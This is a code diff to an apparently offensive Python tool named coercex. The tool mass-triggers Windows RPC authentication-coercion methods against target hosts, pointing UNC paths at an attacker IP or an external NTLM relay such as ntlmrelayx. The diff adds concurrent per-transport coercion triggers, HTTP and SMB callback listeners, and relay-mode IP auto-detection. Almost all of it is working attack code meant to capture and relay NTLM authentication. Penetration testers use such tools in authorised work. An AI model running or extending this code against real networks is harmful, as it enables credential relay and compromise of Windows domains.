@@ -5,18 +5,23 @@ registry into a high-performance concurrent pipeline.
 
 Three modes:
   - scan:   Tries all path styles per method to detect vulnerabilities.
-            Listener optional; without it classifies RPC errors only.
-  - coerce: Triggers coercion using detected (or all) methods.
-            Listener required — starts HTTP/SMB listener for callbacks.
+            Listener optional (``-l``); without it classifies RPC errors
+            only.  When a listener IP is given, binds HTTP **and** SMB
+            on 0.0.0.0 to receive callbacks.
+  - coerce: Fires coercion triggers with UNC paths pointing at an
+            **external** relay (e.g. ntlmrelayx) that the operator
+            already started.  ``-l`` is required so we know where to
+            point the paths, but coercex does **not** bind any port.
   - relay:  Like scan thoroughness but with impacket relay servers
-            capturing and relaying NTLM auth.
+            started by coercex.  ``-l`` is optional — auto-detected
+            from the default route when omitted.
 """
 
 from __future__ import annotations
 
 import asyncio
 import logging
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from enum import Enum, auto
 
 from rich.console import Console
@@ -33,6 +38,7 @@ from coercex.utils import (
     Transport,
     TriggerResult,
     build_unc_path,
+    get_local_ip,
     random_string,
 )
 
@@ -69,7 +75,9 @@ class ScanConfig:
     listener_host: str = ""  # Attacker IP (empty = no listener)
     http_port: int = 80
     smb_port: int = 445
-    transport: Transport = Transport.SMB
+    transport: set[Transport] = field(
+        default_factory=lambda: {Transport.SMB, Transport.HTTP}
+    )
     concurrency: int = 50
     timeout: int = 5
     callback_timeout: float = 3.0
@@ -132,14 +140,14 @@ class Scanner:
             f"concurrency=[bold]{self.config.concurrency}[/]"
         )
 
-        # Start listener for scan/coerce with listener_host set
-        if self.config.mode in (Mode.SCAN, Mode.COERCE) and self.config.has_listener:
+        # ── Scan mode: optional listener (both HTTP+SMB) ────────────
+        if self.config.mode == Mode.SCAN and self.config.has_listener:
             self._listener = AsyncListener(
                 host="0.0.0.0",
                 http_port=self.config.http_port,
                 smb_port=self.config.smb_port,
-                enable_http=self.config.transport == Transport.HTTP,
-                enable_smb=self.config.transport == Transport.SMB,
+                enable_http=True,
+                enable_smb=True,
             )
             await self._listener.start()
             self.console.print(
@@ -147,11 +155,25 @@ class Scanner:
                 f"(http={self.config.http_port}, smb={self.config.smb_port})"
             )
 
-        # Start relay servers for relay mode
+        # ── Coerce mode: NO listener — targets point at external relay ─
+        if self.config.mode == Mode.COERCE:
+            if not self.config.has_listener:
+                log.error("Coerce mode requires --listener (IP of your running relay)")
+                return self.stats
+            self.console.print(
+                f"[yellow]Coerce mode[/] — triggers point at "
+                f"[bold]{self.config.listener_host}[/] "
+                f"(no local listener; assumes external relay is running)"
+            )
+
+        # ── Relay mode: start relay servers, auto-detect IP if needed ──
         if self.config.mode == Mode.RELAY:
             if not self.config.listener_host:
-                log.error("Listener/interface IP required for relay mode")
-                return self.stats
+                self.config.listener_host = get_local_ip()
+                self.console.print(
+                    f"[dim]Auto-detected listener IP: "
+                    f"[bold]{self.config.listener_host}[/][/]"
+                )
             if not self.config.relay_targets:
                 log.error("Relay target(s) required for relay mode (--relay-to)")
                 return self.stats
@@ -199,6 +221,7 @@ class Scanner:
 
     async def _run_scan(self, methods: list[CoercionMethod]) -> None:
         """Scan mode: try all path styles per method to detect vulnerabilities."""
+        allowed = self.config.transport
         tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
@@ -210,6 +233,8 @@ class Scanner:
                             if transport_name == "http"
                             else Transport.SMB
                         )
+                        if transport not in allowed:
+                            continue
                         task = asyncio.create_task(
                             self._attempt(
                                 target,
@@ -223,24 +248,57 @@ class Scanner:
 
         await asyncio.gather(*tasks, return_exceptions=True)
 
-    # ── COERCE: targeted single-path triggers ───────────────────────
+    # ── COERCE: targeted single-path triggers (no local listener) ──
 
     async def _run_coerce(self, methods: list[CoercionMethod]) -> None:
-        """Coerce mode: trigger each method once with the configured transport."""
+        """Coerce mode: fire each method once per transport, pointing at external relay."""
         tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
             for method in methods:
                 for binding in method.pipe_bindings:
-                    task = asyncio.create_task(self._attempt(target, method, binding))
-                    tasks.append(task)
+                    for transport in self.config.transport:
+                        task = asyncio.create_task(
+                            self._attempt_coerce(target, method, binding, transport)
+                        )
+                        tasks.append(task)
 
         await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _attempt_coerce(
+        self,
+        target: str,
+        method: CoercionMethod,
+        binding: PipeBinding,
+        transport: Transport,
+    ) -> None:
+        """Single coerce trigger — no listener, fire and report."""
+        pool = self._pool
+        assert pool is not None
+        async with self._semaphore:
+            port = (
+                self.config.http_port
+                if transport == Transport.HTTP
+                else self.config.smb_port
+            )
+            token = random_string(12)
+            path = build_unc_path(
+                self.config.listener_host,
+                token,
+                transport,
+                port=port,
+                path_style="share_file",
+            )
+
+            result = await trigger_method(pool, target, method, binding, path)
+            self.stats.add(result)
+            self._emit(result)
 
     # ── RELAY: all path styles through relay servers ─────────────────
 
     async def _run_relay(self, methods: list[CoercionMethod]) -> None:
         """Relay mode: try all path styles, relay servers handle NTLM auth."""
+        allowed = self.config.transport
         tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
@@ -252,6 +310,8 @@ class Scanner:
                             if transport_name == "http"
                             else Transport.SMB
                         )
+                        if transport not in allowed:
+                            continue
                         task = asyncio.create_task(
                             self._attempt_relay(
                                 target, method, binding, transport, path_style
@@ -290,7 +350,7 @@ class Scanner:
             self.stats.add(result)
             self._emit(result)
 
-    # ── Core attempt logic ──────────────────────────────────────────
+    # ── Core attempt logic (scan mode) ────────────────────────────
 
     async def _attempt(
         self,
@@ -304,7 +364,7 @@ class Scanner:
         pool = self._pool
         assert pool is not None
         async with self._semaphore:
-            transport = transport_override or self.config.transport
+            transport = transport_override or Transport.SMB
             path_style = path_style_override or "share_file"
 
             use_listener = self.config.has_listener and self._listener is not None
